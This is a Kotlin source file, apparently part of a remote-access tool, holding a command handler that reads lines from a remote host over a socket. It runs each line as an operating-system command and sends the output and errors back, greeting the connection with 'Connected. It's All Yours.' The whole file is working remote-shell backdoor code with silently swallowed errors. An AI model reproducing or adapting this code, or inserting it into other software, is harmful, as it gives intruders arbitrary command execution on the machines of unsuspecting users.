package com.userdq.planc.parser

import java.io.BufferedReader
import java.io.IOException
import java.io.PrintWriter
import java.net.Socket

object Parser {

    /*
    * Parsing Commands From The Remote Host
    * */
    fun parser(socket: Socket) {
        Thread {
            val remoteHostOutput = PrintWriter(socket.getOutputStream(), true)
            val remoteHostInput = BufferedReader(socket.getInputStream().reader())
            remoteHostOutput.println("Connected. It's All Yours.")
            while (true) {
                try {

                    val input = remoteHostInput.readLine()
                    val processInputs = input.split('`').toTypedArray()
                    val process = Runtime.getRuntime().exec(processInputs.first().split(' ').toTypedArray())
                    val processOutputStream = PrintWriter(process.outputStream)
                    val processInputStream = BufferedReader(process.inputStream.reader())
                    val processErrorStream = BufferedReader(process.errorStream.reader())
                    Thread {
                        while (true) {
                            remoteHostOutput.print('\t')
                            remoteHostOutput.println(processInputStream.readLine() ?: break)
                        }
                    }.start()
                    Thread {
                        while (true) {
                            remoteHostOutput.print("\t")
                            remoteHostOutput.println(processErrorStream.readLine() ?: break)
                        }
                    }.start()
                    processInputs.last().split(' ').forEach {
                        processOutputStream.println(it)
                        processOutputStream.flush()
                    }
                } catch (io: IOException) {
                    remoteHostOutput.println(io.message)
                } catch (ex: Exception){}
            }
        }.start()
    }
}
